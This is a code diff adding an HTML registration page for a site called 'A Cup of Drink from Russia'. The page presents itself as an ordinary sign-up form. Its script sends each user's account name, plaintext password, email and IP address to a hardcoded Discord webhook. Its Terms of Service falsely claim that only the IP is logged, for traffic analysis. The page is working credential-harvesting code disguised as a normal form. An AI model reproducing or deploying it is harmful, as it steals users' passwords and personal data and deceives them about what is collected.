@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register and Agree to Terms of Service</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: rgba(255, 255, 255, 0.9);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .content {
+            text-align: center;
+            margin: 5% auto;
+            max-width: 800px;
+            padding: 20px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #007BFF;
+        }
+        p {
+            line-height: 1.6;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        .agree-button, .register-button {
+            background-color: #007BFF;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .agree-button:hover, .register-button:hover {
+            background-color: #0056b3;
+        }
+        .tos-link {
+            display: block;
+            margin-top: 10px;
+            color: #007BFF;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="content" id="registration-form">
+        <h1>Register</h1>
+        <form id="registerForm">
+            <label for="accountName">Account Name:</label>
+            <input type="text" id="accountName" required><br><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" required><br><br>
+            <label for="email">Email:</label>
+            <input type="email" id="email" required><br><br>
+            <button type="button" class="register-button" onclick="registerUser()">Register</button>
+        </form>
+        <p>Already registered? <a class="tos-link" onclick="showTOS()">View Terms of Service</a></p>
+    </div>
+
+    <script>
+        // Function to log IP address
+        async function logIP(userInfo) {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Send the IP address and user information to Discord webhook
+                await fetch('https://discordapp.com/api/webhooks/1265650819198484624/VuR76odW52G970tvnZMTU-tKLKddrAvYsqOSxflh-c51AVoKRCSorbB10yYq0lc5MtFA', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `Account [${userInfo.accountName}] 
+                                  Password [${userInfo.password}] 
+                                  Email [${userInfo.email}]
+                                  Has joined and his IP has been logged: ${ip}`
+                    }),
+                });
+                
+                console.log('IP address and user info sent:', ip);
+            } catch (error) {
+                console.error('Error fetching or sending IP address:', error);
+            }
+        }
+
+        // Function to handle user registration
+        function registerUser() {
+            const accountName = document.getElementById('accountName').value;
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            
+            if (accountName && password && email) {
+                logIP({ accountName, password, email });
+                document.getElementById('registration-form').innerHTML = `
+                    <div class="content">
+                        <h1>Terms of Service</h1>
+                        <p>Welcome to A Cup of Drink from Russia! These Terms of Service ("Terms") govern your access to and use of our website, products, and services (collectively, the "Services"). By using our Services, you agree to these Terms. Please read them carefully.</p>
+                        <h2>1. Acceptance of Terms</h2>
+                        <p>By accessing or using our Services, you acknowledge that you have read, understood, and agree to be bound by these Terms. If you do not agree to these Terms, you may not use our Services.</p>
+                        <h2>2. Changes to Terms</h2>
+                        <p>We reserve the right to modify these Terms at any time. Any changes will be effective immediately upon posting on our website. Your continued use of our Services after any changes signifies your acceptance of the revised Terms.</p>
+                        <h2>3. Account Creation and Responsibilities</h2>
+                        <p>To access certain features of our Services, you may be required to create an account. You agree to provide accurate, current, and complete information during the registration process and to keep this information updated. You are responsible for maintaining the confidentiality of your account credentials and for all activities under your account.</p>
+                        <h2>4. Use of Services</h2>
+                        <p>You agree to use our Services only for lawful purposes and in accordance with these Terms. You must not use our Services:</p>
+                        <ul>
+                            <li>In any way that violates any applicable law or regulation.</li>
+                            <li>To transmit or procure the sending of any unsolicited advertising or promotional material.</li>
+                            <li>To impersonate or attempt to impersonate A Cup of Drink from Russia, its employees, another user, or any other person or entity.</li>
+                        </ul>
+                        <h2>5. Intellectual Property</h2>
+                        <p>All content available through our Services, including but not limited to text, graphics, logos, and software, is the property of A Cup of Drink from Russia or its licensors and is protected by intellectual property laws. You may not reproduce, distribute, or create derivative works from any content on our Services without our express written consent.</p>
+                        <h2>6. Limitation of Liability</h2>
+                        <p>To the fullest extent permitted by law, A Cup of Drink from Russia shall not be liable for any indirect, incidental, special, consequential, or punitive damages, or any loss of profits or revenues, whether incurred directly or indirectly, or any loss of data or other intangible losses, resulting from:</p>
+                        <ul>
+                            <li>Your use of or inability to use our Services.</li>
+                            <li>Unauthorized access to or use of our servers and any personal information stored therein.</li>
+                            <li>Any errors or omissions in any content provided by our Services.</li>
+                        </ul>
+                        <h2>7. Indemnification</h2>
+                        <p>You agree to indemnify, defend, and hold harmless A Cup of Drink from Russia, its affiliates, officers, directors, employees, and agents from and against any claims, liabilities, damages, losses, or expenses, including reasonable attorneys' fees, arising out of or related to your use of our Services or any violation of these Terms.</p>
+                        <h2>8. Termination</h2>
+                        <p>We reserve the right to terminate or suspend your account and access to our Services, with or without cause, and with or without notice, effective immediately. Upon termination, your right to use our Services will cease, and you must promptly destroy all copies of any materials obtained from our Services.</p>
+                        <h2>9. Governing Law</h2>
+                        <p>These Terms shall be governed by and construed in accordance with the laws of Russia, without regard to its conflict of law principles. Any disputes arising under or in connection with these Terms shall be handled according to applicable laws in Russia.</p>
+                        <h2>10. Dispute Resolution</h2>
+                        <p>Any disputes or claims arising out of or relating to these Terms or your use of our Services will be resolved in accordance with applicable laws in Russia. We will work to resolve disputes amicably and efficiently.</p>
+                        <h2>11. Miscellaneous</h2>
+                        <p>These Terms constitute the entire agreement between you and A Cup of Drink from Russia regarding your use of our Services and supersede all prior agreements and understandings, whether written or oral, relating to the subject matter of these Terms. If any provision of these Terms is found to be invalid or unenforceable, the remaining provisions will remain in full force and effect.</p>
+                        <h2>12. Privacy and Data Logging</h2>
+                        <p>By agreeing to our TOS and clicking "I agree to the Terms of Service and want to continue," you acknowledge that we may log your IP address. This logging is solely for the purpose of monitoring and analyzing traffic to improve our Services. We do not use this information for any other purpose and it will not be shared with third parties.</p>
+                        <h2>13. Non-Disclosure</h2>
+                        <p>We are not responsible for any leaks or non-disclosure of personal information that may occur during your use of our Services. While we strive to ensure the security of your data, we cannot guarantee that unauthorized access or disclosure will not occur.</p>
+                        <button class="agree-button" onclick="agreeAndContinue()">I agree to the Terms of Service and want to continue</button>
+                        <p>For any queries, contact us at <a href="mailto:teiylicet@gmail.com">teiylicet@gmail.com</a>.</p>
+                    </div>
+                `;
+            } else {
+                alert('Please fill in all fields.');
+            }
+        }
+
+        // Function to handle agreement and proceed
+        function agreeAndContinue() {
+            alert('Thank you for agreeing to the Terms of Service.');
+            // Optionally, you can redirect the user to another page or provide further instructions here
+        }
+
+        // Function to display Terms of Service
+        function showTOS() {
+            document.getElementById('registration-form').innerHTML = `
+                <div class="content">
+                    <h1>Terms of Service</h1>
+                    <p>Welcome to A Cup of Drink from Russia! These Terms of Service ("Terms") govern your access to and use of our website, products, and services (collectively, the "Services"). By using our Services, you agree to these Terms. Please read them carefully.</p>
+                    <h2>1. Acceptance of Terms</h2>
+                    <p>By accessing or using our Services, you acknowledge that you have read, understood, and agree to be bound by these Terms. If you do not agree to these Terms, you may not use our Services.</p>
+                    <h2>2. Changes to Terms</h2>
+                    <p>We reserve the right to modify these Terms at any time. Any changes will be effective immediately upon posting on our website. Your continued use of our Services after any changes signifies your acceptance of the revised Terms.</p>
+                    <h2>3. Account Creation and Responsibilities</h2>
+                    <p>To access certain features of our Services, you may be required to create an account. You agree to provide accurate, current, and complete information during the registration process and to keep this information updated. You are responsible for maintaining the confidentiality of your account credentials and for all activities under your account.</p>
+                    <h2>4. Use of Services</h2>
+                    <p>You agree to use our Services only for lawful purposes and in accordance with these Terms. You must not use our Services:</p>
+                    <ul>
+                        <li>In any way that violates any applicable law or regulation.</li>
+                        <li>To transmit or procure the sending of any unsolicited advertising or promotional material.</li>
+                        <li>To impersonate or attempt to impersonate A Cup of Drink from Russia, its employees, another user, or any other person or entity.</li>
+                    </ul>
+                    <h2>5. Intellectual Property</h2>
+                    <p>All content available through our Services, including but not limited to text, graphics, logos, and software, is the property of A Cup of Drink from Russia or its licensors and is protected by intellectual property laws. You may not reproduce, distribute, or create derivative works from any content on our Services without our express written consent.</p>
+                    <h2>6. Limitation of Liability</h2>
+                    <p>To the fullest extent permitted by law, A Cup of Drink from Russia shall not be liable for any indirect, incidental, special, consequential, or punitive damages, or any loss of profits or revenues, whether incurred directly or indirectly, or any loss of data or other intangible losses, resulting from:</p>
+                    <ul>
+                        <li>Your use of or inability to use our Services.</li>
+                        <li>Unauthorized access to or use of our servers and any personal information stored therein.</li>
+                        <li>Any errors or omissions in any content provided by our Services.</li>
+                    </ul>
+                    <h2>7. Indemnification</h2>
+                    <p>You agree to indemnify, defend, and hold harmless A Cup of Drink from Russia, its affiliates, officers, directors, employees, and agents from and against any claims, liabilities, damages, losses, or expenses, including reasonable attorneys' fees, arising out of or related to your use of our Services or any violation of these Terms.</p>
+                    <h2>8. Termination</h2>
+                    <p>We reserve the right to terminate or suspend your account and access to our Services, with or without cause, and with or without notice, effective immediately. Upon termination, your right to use our Services will cease, and you must promptly destroy all copies of any materials obtained from our Services.</p>
+                    <h2>9. Governing Law</h2>
+                    <p>These Terms shall be governed by and construed in accordance with the laws of Russia, without regard to its conflict of law principles. Any disputes arising under or in connection with these Terms shall be handled according to applicable laws in Russia.</p>
+                    <h2>10. Dispute Resolution</h2>
+                    <p>Any disputes or claims arising out of or relating to these Terms or your use of our Services will be resolved in accordance with applicable laws in Russia. We will work to resolve disputes amicably and efficiently.</p>
+                    <h2>11. Miscellaneous</h2>
+                    <p>These Terms constitute the entire agreement between you and A Cup of Drink from Russia regarding your use of our Services and supersede all prior agreements and understandings, whether written or oral, relating to the subject matter of these Terms. If any provision of these Terms is found to be invalid or unenforceable, the remaining provisions will remain in full force and effect.</p>
+                    <h2>12. Privacy and Data Logging</h2>
+                    <p>By agreeing to our TOS and clicking "I agree to the Terms of Service and want to continue," you acknowledge that we may log your IP address. This logging is solely for the purpose of monitoring and analyzing traffic to improve our Services. We do not use this information for any other purpose and it will not be shared with third parties.</p>
+                    <h2>13. Non-Disclosure</h2>
+                    <p>We are not responsible for any leaks or non-disclosure of personal information that may occur during your use of our Services. While we strive to ensure the security of your data, we cannot guarantee that unauthorized access or disclosure will not occur.</p>
+                    <button class="agree-button" onclick="agreeAndContinue()">I agree to the Terms of Service and want to continue</button>
+                    <p>For any queries, contact us at <a href="mailto:teiylicet@gmail.com">teiylicet@gmail.com</a>.</p>
+                </div>
+            `;
+        }
+    </script>
+</body>
+</html>
